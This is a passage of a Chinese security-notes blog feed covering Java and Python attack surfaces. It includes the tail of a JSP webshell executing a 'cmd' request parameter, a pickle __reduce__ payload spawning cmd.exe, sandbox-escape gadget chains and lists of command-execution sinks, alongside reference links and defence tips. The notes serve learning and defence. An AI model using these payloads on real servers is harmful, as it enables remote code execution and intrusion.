punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token class-name\">PermissionCollection</span> pc <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Permissions</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            pc<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">AllPermission</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token class-name\">ProtectionDomain</span> protectionDomain <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ProtectionDomain</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">CodeSource</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Certificate</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> pc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">,</span> protectionDomain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">findClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shell\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token operator\">%</span><span class=\"token operator\">></span></pre></td></tr></table></figure><h2 id=\"执行命令变式\"><a class=\"anchor\" href=\"#执行命令变式\">#</a> 执行命令变式</h2>\n<ul>\n<li>java.lang.ProcessBuilder#start</li>\n<li>java.lang.Runtime#exec</li>\n<li>TemplatesImpl</li>\n</ul>\n<h2 id=\"基于反射\"><a class=\"anchor\" href=\"#基于反射\">#</a> 基于反射</h2>\n<ul>\n<li>class.forName</li>\n<li>MethodAccessor.invoke</li>\n<li>Method.invoke</li>\n</ul>\n<h2 id=\"其他shell变式\"><a class=\"anchor\" href=\"#其他shell变式\">#</a> 其他 Shell 变式</h2>\n<ul>\n<li>java.beans.Expression</li>\n<li>java.lang.ClassLoader</li>\n<li>java.net.URLClassLoader</li>\n<li>jdk.nashorn.internal.runtime.ScriptLoader</li>\n<li>ObjectInputStream.resolveClass</li>\n<li>ScriptEngine.eval</li>\n<li>ScriptEngineManager</li>\n<li>ToolProvider.getSystemJavaCompiler</li>\n</ul>\n<h2 id=\"tomcat-容器\"><a class=\"anchor\" href=\"#tomcat-容器\">#</a> Tomcat 容器</h2>\n<ul>\n<li>Servlet</li>\n<li>Filter</li>\n<li>Listener</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"官方文档\"><a class=\"anchor\" href=\"#官方文档\">#</a> 官方文档</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2NvbW1vbnMuYXBhY2hlLm9yZy9wcm9wZXIvY29tbW9ucy1vZ25sLw==\">ognl</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzkvc2VjdXJpdHkvdG9jLmh0bQ==\">Java SE Security Guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzcvZG9jcy90ZWNobm90ZXMvZ3VpZGVzL3JtaS9yZWxub3Rlcy5odG1s\">Java RMI Release Notes for JDK 6</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3JhY2xlLmNvbS90ZWNobmV0d29yay9qYXZhL2phdmFzZS83dTIxLXJlbG5vdGVzLTE5MzI4NzMuaHRtbA==\">Java Release Notes for JDK 7</span></li>\n</ul>\n<h2 id=\"机制说明\"><a class=\"anchor\" href=\"#机制说明\">#</a> 机制说明</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3p3YmlnL3AvMTExMjcyMjIuaHRtbA==\">深入理解 Java 类加载</span></li>\n</ul>\n<h2 id=\"反序列化-3\"><a class=\"anchor\" href=\"#反序列化-3\">#</a> 反序列化</h2>\n<h3 id=\"标准\"><a class=\"anchor\" href=\"#标准\">#</a> 标准</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbGVudGJhbGFuY2V5aC9hcnRpY2xlL2RldGFpbHMvODE4Mzg0OQ==\">Java 序列化【草案一】</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vZW4vamF2YS9qYXZhc2UvMTQvZG9jcy9zcGVjcy9zZXJpYWxpemF0aW9uL2luZGV4Lmh0bWw=\">Java 14 Object Serialization Specification</span></li>\n</ul>\n<h3 id=\"利用与技巧\"><a class=\"anchor\" href=\"#利用与技巧\">#</a> 利用与技巧</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvZnJvaG9mZjEvYXBwc2VjY2FsaS0yMDE1LW1hcnNoYWxsaW5nLXBpY2tsZXM=\">Marshalling Pickles how deserializing objects can ruin your day</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mcm9ob2ZmLmdpdGh1Yi5pby9hcHBzZWNjYWxpLW1hcnNoYWxsaW5nLXBpY2tsZXMv\">AppSecCali 2015: Marshalling Pickles</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3dvdXRlci5jb2VrYWVydHMuYmUvMjAxNS9hbm5vdGF0aW9uaW52b2NhdGlvbmhhbmRsZXI=\">More serialization hacks with AnnotationInvocationHandler</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B3bnRlc3Rlci9KUkU4dTIwX1JDRV9HYWRnZXQ=\">Pure JRE 8 RCE Deserialization gadget</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3NsaWdodGx5cmFuZG9tYnJva2VudGhvdWdodHMuYmxvZ3Nwb3QuY29tLzIwMTAvMDgvYnJlYWtpbmctZGVmZW5zaXZlLXNlcmlhbGl6YXRpb24uaHRtbA==\">Breaking Defensive Serialization</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvbk5UdzNITW5rWDYzZDl5YmR4M1VTUQ==\">Java 反序列化漏洞从入门到深入</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNoYWl0aW4uY24vMjAxNS0xMS0xMV9qYXZhX3Vuc2VyaWFsaXplX3JjZS8=\">Java 反序列化漏洞通用利用分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzE3NjY3Mi5odG1s\">JRE8u20 反序列化漏洞分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzg0Nw==\">浅析 Java 序列化和反序列化</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWN1cml0eS50ZW5jZW50LmNvbS9pbmRleC5waHAvYmxvZy9tc2cvOTc=\">Commons Collections Java 反序列化漏洞深入分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmJsYWNraGF0LmNvbS9ldS0xOS9XZWRuZXNkYXkvZXUtMTktQW4tRmFyLVNpZGVzLU9mLUphdmEtUmVtb3RlLVByb3RvY29scy5wZGY=\">FAR SIDES OF JAVA REMOTE PROTOCOLS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvM2JKNjY4R1ZiMzluVDBORFZELTNJQQ==\">JDK8u20 反序列化漏洞新型 PoC 思路及具体实现</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cub3JhbmdlLnR3LzIwMTgvMDMvcHduLWN0Zi1wbGF0Zm9ybS13aXRoLWphdmEtanJtcC1nYWRnZXQuaHRtbA==\">Pwn a CTF Platform with Java JRMP Gadget</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvNDg0Ni5odG1s\">漫谈 JEP 290</span></li>\n</ul>\n<h3 id=\"框架-2\"><a class=\"anchor\" href=\"#框架-2\">#</a> 框架</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2OTc3MC5odG1s\">WebLogic 反序列化漏洞漫谈</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZXJ0LjM2MC5jbi9yZXBvcnQvZGV0YWlsP2lkPWM4ZWVkNGIzNmZlOGIxOWM1ODVhMTgxN2I1ZjEwYjll\">从 WebLogic 看反序列化漏洞的利用与防御</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NoZW5ncWkxNTgvZmFzdGpzb24tcmVtb3RlLWNvZGUtZXhlY3V0ZS1wb2MvYmxvYi9tYXN0ZXIvSmF2YV9KU09OJUU1JThGJThEJUU1JUJBJThGJUU1JTg4JTk3JUU1JThDJTk2JUU0JUI5JThCJUU2JUFFJTg3XyVFNyU5QyU4QiVFOSU5QiVBQSVFNSVBRSU4OSVFNSU4NSVBOCVFNSVCQyU4MCVFNSU4RiU5MSVFOCU4MCU4NSVFNSVCMyVCMCVFNCVCQyU5QS5wZGY=\">JSON 反序列化之殇</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mval9neDlDX3hMMUx5cm51RkZQRnNmZw==\">Shiro 组件漏洞与攻击链分析</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW5mb3EuY29tL2FydGljbGVzL2FwYWNoZS1zaGlyby8=\">Application Security With Apache Shiro</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NDE3Njk1Ng==\">Shiro 安全框架【快速入门】</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xMzY3NzAy\">Shiro 实战 (四) - 过滤器机制</span></li>\n</ul>\n<h2 id=\"沙箱-2\"><a class=\"anchor\" href=\"#沙箱-2\">#</a> 沙箱</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3BocmFjay5vcmcvcGFwZXJzL2VzY2FwaW5nX3RoZV9qYXZhX3NhbmRib3guaHRtbA==\">Java Sandbox Escape</span></li>\n</ul>\n<h2 id=\"框架-3\"><a class=\"anchor\" href=\"#框架-3\">#</a> 框架</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FwYWNoZS9zdHJ1dHM=\">Struts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FwYWNoZS9zdHJ1dHMtZXhhbXBsZXM=\">Struts Examples</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VjbGlwc2UvamV0dHkucHJvamVjdA==\">Eclipse Jetty</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0xhbmRHcmV5L1NwcmluZ0Jvb3RWdWxFeHBsb2l0\">SpringBootVulExploit</span> SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 checklist</li>\n</ul>\n<h3 id=\"框架利用技巧\"><a class=\"anchor\" href=\"#框架利用技巧\">#</a> 框架利用技巧</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYW5kZ3JleS5tZS9ibG9nLzIyLw==\">Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索</span></li>\n</ul>\n<h2 id=\"rmi-2\"><a class=\"anchor\" href=\"#rmi-2\">#</a> RMI</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veWdqMDkzMC9wLzY1NDI4MTEuaHRtbA==\">Java RMI 与 RPC 的区别</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3JlaWxseS5jb20vbGlicmFyeS92aWV3L2xlYXJuaW5nLWphdmEvMTU2NTkyNzE4NC9jaDExczA0Lmh0bWw=\">Remote Method Invocation (RMI)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzEwOTE=\">Java 中 RMI、JNDI、LADP、JRMP、JMX、JMS 那些事儿</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2RvY3Mub3JhY2xlLmNvbS9jZC9FMTEwMzVfMDEvd2xzMTAwL2NsaWVudC90My5odG1s\">Oracle: Developing T3 Clients</span></li>\n</ul>\n<h2 id=\"jndi-2\"><a class=\"anchor\" href=\"#jndi-2\">#</a> JNDI</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlL3R1dG9yaWFsL2puZGkvb3ZlcnZpZXcvaW5kZXguaHRtbA==\">Overview of JNDI</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzQxNy8=\">关于 JNDI 注入</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvdXMtMTYvbWF0ZXJpYWxzL3VzLTE2LU11bm96LUEtSm91cm5leS1Gcm9tLUpOREktTERBUC1NYW5pcHVsYXRpb24tVG8tUkNFLnBkZg==\">A Journey From JNDI LDAP Manipulation To RCE</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzIwNzQzOS5odG1s\">如何绕过高版本 JDK 的限制进行 JNDI 注入</span></li>\n</ul>\n<h2 id=\"webshell-2\"><a class=\"anchor\" href=\"#webshell-2\">#</a> WebShell</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzc5OA==\">各种姿势 jsp webshell</span></li>\n</ul>\n<h2 id=\"其他漏洞\"><a class=\"anchor\" href=\"#其他漏洞\">#</a> 其他漏洞</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWJzZWMucmVhZHRoZWRvY3MuaW8vemgvbGF0ZXN0L2xhbmd1YWdlL2phdmEvYmxvZy5zcG9vY2suY29tLzIwMTgvMTAvMjMvamF2YS14eGUvaW5kZXguaHRtbA==\">JAVA 常见的 XXE 漏洞写法和防御</span></li>\n</ul>\n",
            "tags": [
                "Java",
                "语言",
                "反序列化",
                "混淆",
                "沙箱",
                "类",
                "JDK"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Python/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Python/",
            "title": "Python",
            "date_published": "2022-11-27T08:42:11.000Z",
            "content_html": "<h1 id=\"格式化字符串\"><a class=\"anchor\" href=\"#格式化字符串\">#</a> 格式化字符串</h1>\n<p>在 Python 中，有两种格式化字符串的方式，在 Python2 的较低版本中，格式化字符串的方式为  <code>&quot;this is a %s&quot; % &quot;test&quot;</code>  ，之后增加了 format 的方式， 语法为  <code>&quot;this is a &#123;&#125;&quot;.format('test')</code>  或者  <code>&quot;this is a &#123;test&#125;&quot;.format(test='test')</code></p>\n<p>当格式化字符串由用户输入时，则可能会造成一些问题，下面是一个最简单的例子</p>\n<pre><code>&gt;&gt;&gt; 'class of &#123;0&#125; is &#123;0.__class__&#125;'.format(42)\n&quot;class of 42 is &lt;class 'int'&gt;&quot;\n</code></pre>\n<p>从上面这个简单的例子不难知道，当我们可以控制要 format 的字符串时，则可以使用  <code>__init__</code>  /  <code>__globals__</code>  等属性读取一些比较敏感的值，甚至任意执行代码。</p>\n<h1 id=\"反序列化\"><a class=\"anchor\" href=\"#反序列化\">#</a> 反序列化</h1>\n<h2 id=\"pickle-demo\"><a class=\"anchor\" href=\"#pickle-demo\">#</a> pickle demo</h2>\n<p>Python Pickle 在反序列化时会调用  <code>__reduce__</code>  ，可用自定义的  <code>__reduce__</code>  函数来实现攻击。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> pickle</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> pickletools</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> subprocess</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    a <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    b <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__reduce__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>Popen<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cmd.exe'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>data <span class=\"token operator\">=</span> pickle<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>pickletools<span class=\"token punctuation\">.</span>dis<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"其他序列化库\"><a class=\"anchor\" href=\"#其他序列化库\">#</a> 其他序列化库</h2>\n<ul>\n<li>PyYAML</li>\n<li>marshal</li>\n<li>shelve</li>\n</ul>\n<h1 id=\"沙箱\"><a class=\"anchor\" href=\"#沙箱\">#</a> 沙箱</h1>\n<h2 id=\"常用函数\"><a class=\"anchor\" href=\"#常用函数\">#</a> 常用函数</h2>\n<ul>\n<li>eval / exec / compile</li>\n<li>dir / type</li>\n<li>globals / locals / vars</li>\n<li>getattr / setattr</li>\n</ul>\n<h2 id=\"导入包方式\"><a class=\"anchor\" href=\"#导入包方式\">#</a> 导入包方式</h2>\n<ul>\n<li><code>import os</code></li>\n<li><code>from os import *</code></li>\n<li><code>__import__(&quot;os&quot;)</code></li>\n<li><code>importlib</code></li>\n<li><code>imp</code></li>\n<li><code>reload(os)</code></li>\n<li><code>execfile</code>  仅 Python2 支持</li>\n</ul>\n<h2 id=\"绕过\"><a class=\"anchor\" href=\"#绕过\">#</a> 绕过</h2>\n<ul>\n<li><code>dir(__builtins__)</code>  查看内置模块</li>\n<li>最简单的思路是在已有的模块中 import，如果那个模块中已经 import 可以利用的模块就可以使用了</li>\n<li>在父类中寻找可用的模块，最常见 payload 是  <code>().__class__.__bases__[0].__subclasses__()</code>  或者用魔术方法获取全局作用域  <code>__init__.__func__.__globals__</code></li>\n<li>有些网站没有过滤 pickle 模块，可以使用 pickle 实现任意代码执行，生成 payload 可以使用  <code>https://gist.github.com/freddyb/3360650</code></li>\n<li>有的沙箱把相关的模块代码都被删除了，则可以使用 libc 中的函数，Python 中调用一般可以使用 ctypes 或者 cffi。</li>\n<li><code>&quot;A&quot;&quot;B&quot; == &quot;AB&quot;</code></li>\n</ul>\n<h2 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h2>\n<p>Python 官方给出了一些防御的建议</p>\n<ul>\n<li>使用 Jython 并尝试使用 Java 平台来锁定程序的权限</li>\n<li>使用 fakeroot 来避免</li>\n<li>使用一些 rootjail 的技术</li>\n</ul>\n<h1 id=\"框架\"><a class=\"anchor\" href=\"#框架\">#</a> 框架</h1>\n<h2 id=\"django\"><a class=\"anchor\" href=\"#django\">#</a> Django</h2>\n<h3 id=\"历史漏洞\"><a class=\"anchor\" href=\"#历史漏洞\">#</a> 历史漏洞</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzU4Lw==\">CVE-2016-7401 CSRF Bypass</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGphbmdvcHJvamVjdC5jb20vd2VibG9nLzIwMTcvYXByLzA0L3NlY3VyaXR5LXJlbGVhc2VzLw==\">CVE-2017-7233/7234 Open redirect vulnerability</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vZGphbmdvLWRlYnVnLXBhZ2UteHNzLmh0bWw=\">CVE-2017-12794 debug page XSS</span></li>\n</ul>\n<h3 id=\"配置相关\"><a class=\"anchor\" href=\"#配置相关\">#</a> 配置相关</h3>\n<ul>\n<li>Nginx 在为 Django 做反向代理时，静态文件目录配置错误会导致源码泄露。访问 /static.. 会 301 重定向到 /static../</li>\n</ul>\n<h2 id=\"flask\"><a class=\"anchor\" href=\"#flask\">#</a> Flask</h2>\n<p>Flask 默认使用客户端 session，使得 session 可以被伪造</p>\n<h1 id=\"代码混淆\"><a class=\"anchor\" href=\"#代码混淆\">#</a> 代码混淆</h1>\n<h2 id=\"常见混淆方式\"><a class=\"anchor\" href=\"#常见混淆方式\">#</a> 常见混淆方式</h2>\n<ul>\n<li>基于 AST 变换</li>\n<li>编译为 pyc 文件</li>\n<li>Pyinstaller</li>\n<li>PyArmor</li>\n<li>通过 AES 加密为 pye 文件</li>\n</ul>\n<h1 id=\"sink\"><a class=\"anchor\" href=\"#sink\">#</a> Sink</h1>\n<h2 id=\"命令执行\"><a class=\"anchor\" href=\"#命令执行\">#</a> 命令执行</h2>\n<ul>\n<li>asyncio.new_event_loop().subprocess_exec</li>\n<li>asyncio.subprocess</li>\n<li>bdb.os</li>\n<li>cgi.os.system</li>\n<li>cgi.sys</li>\n<li>code.InteractiveInterpreter</li>\n<li>commands</li>\n<li>ctypes.CDLL</li>\n<li>eval</li>\n<li>exec</li>\n<li>execfile</li>\n<li>input // python2 only</li>\n<li>os.exec</li>\n<li>os.exec*</li>\n<li>os.fork</li>\n<li>os.popen</li>\n<li>os.spawn</li>\n<li>os.system</li>\n<li>platform.os</li>\n<li>platform.popen</li>\n<li>platform.sys</li>\n<li>popen2</li>\n<li>pty.os</li>\n<li>pty.spawn</li>\n<li>subprocess</li>\n<li>timeit.sys</li>\n<li>timeit.timeit</li>\n<li>typing.get_type_hints() +  <code>__annotations__</code></li>\n<li>...</li>\n</ul>\n<h2 id=\"文件读取\"><a class=\"anchor\" href=\"#文件读取\">#</a> 文件读取</h2>\n<ul>\n<li>open</li>\n<li>os.open</li>\n<li>urllib.request.urlopen('[file:///](file:///)')</li>\n<li>codecs.open</li>\n<li>fileinput</li>\n<li>仅 Python2\n<ul>\n<li>types.FileType</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"危险第三方库\"><a class=\"anchor\" href=\"#危险第三方库\">#</a> 危险第三方库</h2>\n<ul>\n<li>Template</li>\n<li>subprocess32</li>\n</ul>\n<h2 id=\"反序列化-2\"><a class=\"anchor\" href=\"#反序列化-2\">#</a> 反序列化</h2>\n<ul>\n<li>marshal</li>\n<li>PyYAML</li>\n<li>pickle</li>\n<li>cPickle</li>\n<li>shelve</li>\n<li>PIL</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"反序列化-3\"><a class=\"anchor\" href=\"#反序列化-3\">#</a> 反序列化</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy45MXJpLm9yZy85NTc2Lmh0bWw=\">Python pickle 反序列化</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLnB5dGhvbi5vcmcvbW9pbi9TYW5kYm94ZWRQeXRob24=\">Python 沙箱 官方 wiki</span></li>\n<li>[Python eval 的常见错误封装及利用原理](<span class=\"exturl\" data-url=\"aHR0cDovL3h4bGVnZW5kLmNvbS8yMDE1LzA3LzMxL1B5dGhvbg==\">http://xxlegend.com/2015/07/31/Python</span> eval 的常见错误封装及利用原理 /)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy9saWJyYXJ5L3BpY2tsZS5odG1s\">pickle Python 对象序列化</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpYS5ibGFja2hhdC5jb20vYmgtdXMtMTEvU2xhdmllcm8vQkhfVVNfMTFfU2xhdmllcm9fU291cl9QaWNrbGVzX1NsaWRlcy5wZGY=\">Sour Pickles A serialised exploitation guide in one part</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ydXNodGVyLmNvbS9ibG9nL3BpY2tsZS1zZXJpYWxpemF0aW9uLWludGVybmFscy8=\">How pickle works in Python</span></li>\n</ul>\n<h2 id=\"沙箱-2\"><a class=\"anchor\" href=\"#沙箱-2\">#</a> 沙箱</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvODYzNjY=\">Python 沙箱通用绕过</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzIwMzIwOC5odG1s\">一文看懂 Python 沙箱逃逸</span></li>\n</ul>\n<h2 id=\"格式化字符串-2\"><a class=\"anchor\" href=\"#格式化字符串-2\">#</a> 